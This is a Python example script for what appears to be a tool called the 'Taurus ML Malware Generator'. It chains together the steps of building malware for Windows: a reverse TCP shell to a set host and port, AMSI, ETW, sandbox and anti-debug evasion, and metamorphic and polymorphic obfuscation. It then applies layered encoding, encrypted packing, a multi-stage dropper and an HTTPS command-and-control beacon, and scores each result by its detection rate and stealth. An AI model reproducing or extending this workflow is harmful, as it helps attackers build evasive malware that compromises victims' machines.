"""
Advanced Example: Complete Payload Generation Workflow
Demonstrates all features of the Taurus ML Malware Generator
"""
from ml_engine import get_ml_engine
from generators.payload_factory import get_payload_factory
from obfuscation.obfuscator import get_obfuscator, get_encoder
from evasion.evasion_techniques import get_evasion_orchestrator
from utils.payload_packer import get_packer
from generators.c2_templates import get_c2_factory
from testing.detector import get_detector, get_functionality_tester, MetricsCalculator
from utils.logger import get_logger
import time
import json

logger = get_logger()


def main():
    """Advanced workflow demonstrating all features"""
    
    logger.info("=== Advanced ML Malware Generator Workflow ===")
    
    # Configuration
    config = {
        "lhost": "192.168.1.100",
        "lport": 4444,
        "target_os": "windows",
        "architecture": "x64",
        "obfuscation_level": 5,
        "use_ml": True,
        "use_evasion": True,
        "use_packing": True,
        "generate_c2": True,
    }
    
    logger.info(f"Configuration: {json.dumps(config, indent=2)}")
    
    # ==========================================
    # Step 1: Generate Base Payload
    # ==========================================
    logger.info("\\n[Step 1] Generating base reverse shell payload...")
    factory = get_payload_factory()
    
    payload, metadata = factory.generate_reverse_shell_tcp(
        lhost=config["lhost"],
        lport=config["lport"],
        target_os=config["target_os"],
        architecture=config["architecture"],
    )
    
    logger.success(f"Base payload generated: {len(payload)} bytes")
    
    # ==========================================
    # Step 2: Apply Evasion Techniques
    # ==========================================
    if config["use_evasion"]:
        logger.info("\\n[Step 2] Applying evasion techniques...")
        evasion = get_evasion_orchestrator()
        
        # Check environment safety
        safety_check = evasion.check_environment_safety()
        logger.info(f"Environment safety check: {safety_check}")
        
        # Apply all evasion techniques
        evaded_payload, evasion_metadata = evasion.apply_all_evasions(
            payload,
            techniques=["amsi", "etw", "sandbox", "anti_debug"],
        )
        
        logger.success(f"Evasion applied: {len(evasion_metadata['techniques_applied'])} techniques")
        logger.info(f"Size after evasion: {len(evaded_payload)} bytes")
        
        payload = evaded_payload
        metadata["evasion"] = evasion_metadata
    
    # ==========================================
    # Step 3: Apply Advanced Obfuscation
    # ==========================================
    logger.info("\\n[Step 3] Applying advanced obfuscation...")
    obfuscator = get_obfuscator()
    
    # Use all advanced techniques
    advanced_techniques = [
        "metamorphic_transform",
        "instruction_substitution",
        "opaque_predicates",
        "junk_code_generation",
        "control_flow_flattening",
    ]
    
    obfuscated, obf_metadata = obfuscator.obfuscate_payload(
        payload,
        level=config["obfuscation_level"],
        techniques=advanced_techniques,
    )
    
    logger.success(f"Obfuscation applied: {len(obf_metadata['techniques_applied'])} techniques")
    logger.info(f"Techniques: {', '.join(obf_metadata['techniques_applied'])}")
    logger.info(f"Size after obfuscation: {len(obfuscated)} bytes")
    
    metadata["obfuscation"] = obf_metadata
    
    # ==========================================
    # Step 4: Generate Polymorphic Variants
    # ==========================================
    logger.info("\\n[Step 4] Generating polymorphic variants...")
    
    variants = obfuscator.apply_polymorphic_obfuscation(
        obfuscated,
        num_variants=3,
    )
    
    logger.success(f"Generated {len(variants)} polymorphic variants")
    
    for i, (variant, variant_meta) in enumerate(variants, 1):
        logger.info(f"Variant {i}: {len(variant)} bytes, seed={variant_meta['polymorphic_seed']}")
    
    # Use first variant
    payload = variants[0][0]
    metadata["polymorphic"] = variants[0][1]
    
    # ==========================================
    # Step 5: Apply Multi-Layer Encoding
    # ==========================================
    logger.info("\\n[Step 5] Applying multi-layer encoding...")
    encoder = get_encoder()
    
    encoded, encoding_layers = encoder.multi_layer_encode(
        payload,
        encoders=["xor", "base64", "custom_ml"],
    )
    
    logger.success(f"Applied {len(encoding_layers)} encoding layers")
    logger.info(f"Size after encoding: {len(encoded)} bytes")
    
    metadata["encoding"] = encoding_layers
    
    # ==========================================
    # Step 6: Pack and Encrypt
    # ==========================================
    if config["use_packing"]:
        logger.info("\\n[Step 6] Packing and encrypting payload...")
        packer = get_packer()
        
        packed, pack_metadata = packer.pack_payload(
            encoded,
            compression="lzma",
            encryption="aes",
            anti_unpack=True,
        )
        
        logger.success(f"Payload packed and encrypted")
        logger.info(f"Compression ratio: {pack_metadata['compression_ratio']:.2%}")
        logger.info(f"Final size: {len(packed)} bytes")
        
        payload = packed
        metadata["packing"] = pack_metadata
    
    # ==========================================
    # Step 7: Create Multi-Stage Payload
    # ==========================================
    logger.info("\\n[Step 7] Creating multi-stage payload...")
    
    # Create simple dropper as stage 1
    dropper_code = b"# Stage 1 Dropper\\nDownload and execute stage 2"
    
    multi_stage, stage_metadata = packer.create_multi_stage_payload(
        stage1=dropper_code,
        stage2=payload,
    )
    
    logger.success(f"Multi-stage payload created")
    logger.info(f"Total stages: {stage_metadata['num_stages']}")
    logger.info(f"Total size: {stage_metadata['total_size']} bytes")
    
    metadata["multi_stage"] = stage_metadata
    
    # ==========================================
    # Step 8: Generate C2 Template
    # ==========================================
    if config["generate_c2"]:
        logger.info("\\n[Step 8] Generating C2 communication template...")
        c2_factory = get_c2_factory()
        
        # Create HTTP beacon
        http_beacon = c2_factory.create_http_beacon(
            c2_server=config["lhost"],
            c2_port=443,
            use_https=True,
        )
        
        beacon_code = http_beacon.generate_beacon_code()
        handler_code = http_beacon.generate_command_handler()
        crypto_functions = c2_factory.generate_encryption_functions()
        
        c2_template = crypto_functions + beacon_code + handler_code
        
        logger.success(f"C2 template generated: {len(c2_template)} bytes")
        
        # Save C2 template
        with open("output/c2_template.ps1", "wb") as f:
            f.write(c2_template)
        
        logger.info("C2 template saved to output/c2_template.ps1")
    
    # ==========================================
    # Step 9: Evaluate Payload
    # ==========================================
    logger.info("\\n[Step 9] Evaluating final payload...")
    detector = get_detector()
    
    start_time = time.time()
    detection_results = detector.analyze_payload(
        multi_stage,
        use_virustotal=False,
        use_local=True,
    )
    
    # Test functionality
    tester = get_functionality_tester()
    functionality_results = tester.test_payload_functionality(
        multi_stage,
        payload_type="reverse_shell_tcp",
    )
    
    # Calculate metrics
    generation_time = time.time() - start_time
    metrics = MetricsCalculator.calculate_metrics(
        detection_results,
        functionality_results,
        generation_time,
    )
    
    # ==========================================
    # Step 10: Display Results
    # ==========================================
    logger.info("\\n" + "="*60)
    logger.info("FINAL RESULTS")
    logger.info("="*60)
    
    logger.info(f"\\nPayload Information:")
    logger.info(f"  Original size: {metadata['original_size']} bytes")
    logger.info(f"  Final size: {len(multi_stage)} bytes")
    logger.info(f"  Size increase: {(len(multi_stage) / metadata['original_size'] - 1) * 100:.1f}%")
    
    logger.info(f"\\nTechniques Applied:")
    if "evasion" in metadata:
        logger.info(f"  Evasion: {', '.join(metadata['evasion']['techniques_applied'])}")
    logger.info(f"  Obfuscation: {', '.join(metadata['obfuscation']['techniques_applied'])}")
    logger.info(f"  Encoding: {len(metadata['encoding'])} layers")
    if "packing" in metadata:
        logger.info(f"  Packing: {metadata['packing']['compression']} + {metadata['packing']['encryption']}")
    
    logger.info(f"\\nDetection Analysis:")
    logger.info(f"  Detection Rate: {metrics['detection_rate']:.1%}")
    logger.info(f"  Stealth Score: {metrics['stealth_score']:.1%}")
    logger.info(f"  Entropy: {detection_results['local_analysis']['entropy']:.2f}")
    
    logger.info(f"\\nFunctionality:")
    logger.info(f"  Tests Passed: {functionality_results['tests_passed']}")
    logger.info(f"  Tests Failed: {functionality_results['tests_failed']}")
    logger.info(f"  Functionality Score: {metrics['functionality_score']:.1%}")
    
    logger.info(f"\\nOverall:")
    logger.info(f"  Overall Score: {metrics['overall_score']:.1%}")
    logger.info(f"  Success: {'✓' if metrics['success'] else '✗'}")
    logger.info(f"  Generation Time: {generation_time:.2f}s")
    
    # ==========================================
    # Step 11: Save Everything
    # ==========================================
    logger.info("\\n[Step 11] Saving outputs...")
    
    import os
    os.makedirs("output", exist_ok=True)
    
    # Save final payload
    output_path = factory.save_payload(
        multi_stage,
        "output/advanced_payload.bin",
        metadata,
    )
    
    # Save all variants
    for i, (variant, variant_meta) in enumerate(variants, 1):
        factory.save_payload(
            variant,
            f"output/variant_{i}.bin",
            variant_meta,
        )
    
    # Save results
    with open("output/evaluation_results.json", "w") as f:
        json.dump({
            "detection": detection_results,
            "functionality": functionality_results,
            "metrics": metrics,
            "metadata": metadata,
        }, f, indent=2)
    
    logger.success(f"\\nAll outputs saved to output/ directory")
    logger.info("="*60)
    logger.info("Advanced workflow complete!")
    logger.info("="*60)


if __name__ == "__main__":
    main()
